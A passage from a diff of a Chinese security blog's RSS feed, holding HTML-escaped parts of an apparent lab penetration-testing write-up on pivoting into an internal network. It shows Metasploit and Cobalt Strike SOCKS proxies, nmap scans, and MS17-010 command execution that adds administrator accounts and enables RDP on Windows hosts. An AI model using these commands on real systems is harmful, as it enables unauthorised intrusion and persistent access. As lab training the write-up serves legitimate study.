+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; use auxiliary/server/socks_proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; show options
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; set VERSION 5
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;VERSION =&amp;gt; 5
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; set username admin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;username =&amp;gt; admin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; set password admin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(server/socks_proxy) &amp;gt; run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;重新开个终端vim /etc/proxychains.conf,如下配置&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209162027957.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209162027957&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;返回msf6,输入&lt;code&gt;proxychains curl http://192.168.52.143/yxcms/index.php&lt;/code&gt;,测试可以成功访问192.168.52.0网段&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209162205894.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209162205894&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;42-cs直接建立socks5代理&#34;&gt;4.2 CS直接建立socks5代理
+&lt;/h4&gt;&lt;p&gt;右键点击机器-&amp;gt;代理转发-&amp;gt;socks代理,发现是62549端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209162347235.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209162347235&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;proxifier检测成功,还是这个更方便点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209162500913.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209162500913&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再在代理规则选择刚才那个即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209163321746.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209163321746&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209163352580.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209163352580&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;43-渗透同域主机19216852141&#34;&gt;4.3 渗透同域主机192.168.52.141
+&lt;/h4&gt;&lt;p&gt;&lt;code&gt;proxychains nmap -Pn 192.168.52.141&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209164251738.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209164251738&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过445smb端口检测操作系统为Windows server2003,&lt;code&gt;proxychains nmap -sV 192.168.52.141 -p 445&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209164513076.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209164513076&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;搜了一下2003全是永恒之蓝&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209165028841.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209165028841&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;先用第三个模块检测一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209170232546.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209170232546&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209165759224.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209165759224&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;换用这个代码执行试试&lt;code&gt;use auxiliary/admin/smb/ms17_010_command&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;代码成功运行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209170439287.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209170439287&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来执行如下命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command net user gucheng !@#123qwe!@# /add #添加用户
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command net localgroup administrators gucheng /add #管理员权限
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command &amp;#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&amp;#39;		#开启rdp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用rdesktop连接&lt;code&gt;proxychains rdesktop 192.168.52.141&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209171859855.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209171859855&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;连接成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209171919145.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209171919145&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;msf设置正反向shell都打不通不知道为啥,登个远程桌面算了&lt;/p&gt;
+&lt;h4 id=&#34;44-打域控&#34;&gt;4.4 打域控
+&lt;/h4&gt;&lt;p&gt;扫描端口,发现445又开启了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209182152367.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209182152367&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来执行如下命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command net user gucheng2 !@#123qwe!@# /add #添加用户
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command net localgroup administrators gucheng2 /add #管理员权限
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command netsh advfirewall firewall add rule name=&amp;#34;Remote Desktop&amp;#34; protocol=TCP dir=in localport=3389 action=allow		#开启防火墙端口
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set command &amp;#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&amp;#39;		#开启rdp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;创建成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209180926400.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209180926400&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;proxychains rdesktop 192.168.52.138&lt;/code&gt; 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/static/img/image-20241209183526997.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241209183526997&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>[陇剑杯2021]机密内存复现</title>
         <link>http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/</link>
         <pubDate>Sat, 30 Nov 2024 12:56:25 +0800</pubDate>
